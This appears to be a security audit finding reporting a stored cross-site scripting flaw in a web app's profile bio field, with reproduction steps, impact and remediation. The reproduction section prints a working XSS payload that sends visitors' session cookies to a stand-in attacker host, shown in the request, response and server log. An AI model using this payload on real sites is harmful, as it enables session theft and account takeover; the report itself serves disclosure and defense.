# CRITICAL Finding: Stored Cross-Site Scripting in User Profile Bio

| Field | Value |
|---|---|
| **ID** | VULN-001 |
| **Title** | Stored Cross-Site Scripting (XSS) in User Profile Bio Field |
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.0 |
| **CVSS v3.1 Vector** | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N |
| **Category** | Cross-Site Scripting |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **OWASP Top 10** | A03:2021 - Injection |
| **Affected Component** | https://app.example.com/api/v2/users/profile |
| **Affected Parameter** | `bio` field in profile update request |
| **Authentication Required** | Low (any authenticated user) |
| **Status** | Open |
| **Date Discovered** | 2026-03-16 |
| **Discovered By** | Security Analyst |
| **Remediation Deadline** | Immediate -- within 7 days |

---

## PRIORITY NOTICE

This vulnerability allows any authenticated user to inject persistent JavaScript that executes in the browsers of all users who view the attacker's profile, including administrators. Combined with the admin panel's cookie-based authentication (no additional CSRF protection), this can be chained to achieve full administrative account takeover.

---

## Description

The user profile bio field at `https://app.example.com/settings/profile` does not sanitize HTML or JavaScript input before storing it in the database. When any user views a profile page containing a malicious bio, the injected JavaScript executes in their browser context.

The application uses React on the frontend, but the bio field is rendered using `dangerouslySetInnerHTML` to support "rich text" formatting. No server-side sanitization or Content Security Policy nonce-based restrictions prevent script execution.

### Root Cause

The `/api/v2/users/profile` endpoint accepts arbitrary HTML in the `bio` field without sanitization. The frontend renders this content using React's `dangerouslySetInnerHTML` property, which bypasses React's built-in XSS protection. There is no server-side HTML sanitization library (such as DOMPurify or bleach) in the processing pipeline.

## Reproduction Steps

**Prerequisites:**
- Two user accounts: attacker account and victim account (or admin account)
- Burp Suite or browser developer tools

**Steps:**

1. Log in as the attacker user at `https://app.example.com/login`

2. Navigate to `https://app.example.com/settings/profile`

3. In the "Bio" field, enter the following payload:
   ```html
   <img src=x onerror="fetch('https://attacker-server.example.net/steal?cookie='+document.cookie)">
   ```

4. Click "Save Profile"

5. Log in as a different user (or admin) in a separate browser

6. Navigate to the attacker's profile page: `https://app.example.com/users/attacker-username`

7. Observe that the JavaScript executes, and the victim's session cookie is sent to the attacker-controlled server

**Proof of Concept Request (Profile Update):**

```http
PUT /api/v2/users/profile HTTP/2
Host: app.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Cookie: session=abc123def456

{
  "display_name": "Normal User",
  "bio": "<img src=x onerror=\"fetch('https://attacker-server.example.net/steal?cookie='+document.cookie)\">",
  "location": "New York"
}
```

**Response (Profile Update -- confirms storage):**

```http
HTTP/2 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "Profile updated successfully",
  "user": {
    "id": 1042,
    "display_name": "Normal User",
    "bio": "<img src=x onerror=\"fetch('https://attacker-server.example.net/steal?cookie='+document.cookie)\">",
    "location": "New York"
  }
}
```

**Victim's Browser (when viewing attacker's profile):**

The browser executes the injected JavaScript and sends a request to the attacker's server:

```
GET /steal?cookie=session=victim_session_token_here HTTP/1.1
Host: attacker-server.example.net
```

**Attacker's Server Log:**

```
2026-03-16 14:32:15 - 203.0.113.50 - GET /steal?cookie=session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1LCJyb2xlIjoiYWRtaW4ifQ.abc123 - 200
```

## Impact

### Technical Impact

- **Session Hijacking:** Attacker captures session cookies of any user (including administrators) who views the malicious profile
- **Account Takeover:** Using stolen admin session tokens, the attacker can access the admin panel, modify system settings, access all user data, and create new admin accounts
- **Persistent Attack:** The payload remains in the database and executes every time any user views the profile, until the malicious bio content is removed
- **Worm Potential:** A more sophisticated payload could automatically update the bios of visitors' profiles, creating a self-propagating XSS worm

### Business Impact

- **Data Breach:** Administrative access exposes all user PII (names, emails, addresses, payment information) -- estimated 50,000 user records at risk
- **Regulatory:** Potential GDPR/CCPA violation if user data is exfiltrated, with fines up to 4% of annual revenue
- **Reputation:** Public disclosure of a stored XSS leading to mass account compromise would severely damage customer trust
- **Operational:** Incident response and cleanup of a worm-style attack would require significant engineering effort

### Exploitability Assessment

| Factor | Rating |
|---|---|
| Attack Complexity | Low -- single request to inject payload |
| Privileges Required | Low -- any registered user |
| User Interaction | Required -- victim must view the attacker's profile |
| Exploit Maturity | Functional -- complete working PoC |
| Reliability | Always -- triggers on every profile view |

## Remediation

### Immediate Mitigation (apply now)

1. **Sanitize existing database content:** Run a database query to strip HTML tags from all existing `bio` fields
2. **Set HttpOnly flag on session cookies:** This prevents JavaScript from accessing cookies, breaking the demonstrated attack chain
   ```
   Set-Cookie: session=token; HttpOnly; Secure; SameSite=Strict
   ```
3. **Tighten CSP:** Add a strict Content Security Policy that blocks inline scripts:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<random>'; style-src 'self'; img-src 'self' data:
   ```

### Permanent Fix

1. **Server-side sanitization:** Implement HTML sanitization on the `bio` field at the API level before storing in the database
   ```javascript
   // Node.js with DOMPurify
   const createDOMPurify = require('dompurify');
   const { JSDOM } = require('jsdom');
   const DOMPurify = createDOMPurify(new JSDOM('').window);

   // In the profile update handler
   const sanitizedBio = DOMPurify.sanitize(req.body.bio, {
       ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
       ALLOWED_ATTR: ['href']
   });
   ```

2. **Replace dangerouslySetInnerHTML:** Use a safe rendering approach on the frontend
   ```jsx
   // BEFORE (vulnerable)
   <div dangerouslySetInnerHTML={{ __html: user.bio }} />

   // AFTER (safe -- render as plain text, or use sanitized markdown)
   <div>{user.bio}</div>
   // Or use a markdown renderer with sanitization
   ```

3. **Input validation:** Enforce maximum length and character restrictions on the bio field

### Verification

1. Attempt to save `<script>alert(1)</script>` in the bio field -- should be stripped or escaped
2. Attempt to save `<img src=x onerror=alert(1)>` -- should be stripped
3. View the profile page and confirm no JavaScript execution occurs
4. Verify existing profiles with HTML content are rendered safely

## Evidence

**Screenshot 1:** Profile edit form with XSS payload entered in the Bio field
(Shows the attacker entering the payload in the profile settings page)

**Screenshot 2:** Victim viewing attacker's profile -- browser developer tools showing the outbound request to attacker-server.example.net
(Network tab showing the stolen cookie being sent to the external server)

**Screenshot 3:** Attacker's server log showing received session cookie
(Server access log with the captured admin session token)

**Screenshot 4:** Attacker using stolen admin session to access admin panel
(Admin dashboard accessed using the hijacked session cookie)

## References

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- DOMPurify: https://github.com/cure53/DOMPurify
- React dangerouslySetInnerHTML security: https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
